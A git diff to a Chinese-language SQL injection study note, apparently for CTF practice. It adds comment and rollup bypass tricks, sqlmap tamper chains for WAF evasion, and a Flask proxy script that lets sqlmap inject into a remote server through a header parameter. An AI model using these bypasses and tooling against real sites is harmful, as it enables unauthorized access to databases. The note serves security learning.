@@ -218,7 +218,7 @@ union select
   * ``/**/``
   * ``\# -> %23``
 
-  * ``--`` 
+  * ``-- `` 
 
 * ``order by``看字段数 先看看有几个回显点也可以用``group by``
 
@@ -292,7 +292,7 @@ union select
     
     mysql查询的时候将会忽略字符串尾部的空格
   
-  * 格式化字符串逃逸
+  * 格式化字符串逃逸 ``%``
     https://zhuanlan.zhihu.com/p/115777073 
 
   * order by 盲注
@@ -350,6 +350,8 @@ union select
         |  1 | eki      | NULL     | 233   |
         +----+----------+----------+-------+
       ```
+    * group by + with rollup 绕过二次密码检验
+      分组rollup后参数为NULL 
 ## 关于Sqlite
 
 sqlite每个db文件就是一个数据库，不存在``information_schema``数据库，但存在类似作用的表``sqlite_master``。
@@ -453,6 +455,10 @@ sqlmap -u url --dump -C字段 -T 表段 -D 数据库 //猜解
 sqlmap -u url --dump --start=1 --stop=3 -C字段 -T 表段 -D 数据库 //猜解1到3的字段
 ```
 
+常用的一些tamper
+
+``space2comment,randomcase``
+
 写一个简单的temper
 
 ```python
@@ -469,6 +475,64 @@ def tamper(payload, **kwargs):
     return "1`,"+payload+")#"
 ```
 
+### 代理注入
+
+example:
+
+```python
+from flask import Flask,request
+import requests
+
+purl = "http://xxx"
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    status=request.args.get('a')
+
+    headers = {
+        'Host': 'xxx.xxx',
+        'Connection': 'close',
+        'Status': status,
+        'DNT': '1',
+        'sec-ch-ua-mobile': '?0',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
+        'sec-ch-ua': '"Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"',
+        'Accept': '*/*',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Dest': 'empty',
+        'Referer': 'http://xxx/',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+    }
+
+    res = requests.get('https://xxx/server.php', headers=headers, verify=False)    
+    return res.text
+
+if __name__ == '__main__':
+    app.run(host="0.0.0.0",debug=True,port=8000)
+```
+
+这样就可以sqlmap本地服务来对远程服务进行注入，方便指定真实注入点和控制参数
+
+### 利用SQLMAP FUZZ
+
+无脑叠tamper就行
+
+普通tamper搭配方式:
+```
+tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+```
+数据库为MSSQL的搭配方式:
+```
+tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+```
+数据库为MySql的搭配方式:
+```
+tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversi
+```
 ## JDBC 注入
 
 ```
@@ -485,3 +549,7 @@ jdbc:mysql://localhost:3306/数据库名?user=用户名&password=密码&useUnico
 sqlite 全函数查询
 
 https://www.sqlite.org/lang_corefunc.html
+
+sqlmap tamper的使用
+
+https://www.cnblogs.com/r00tuser/p/7252796.html
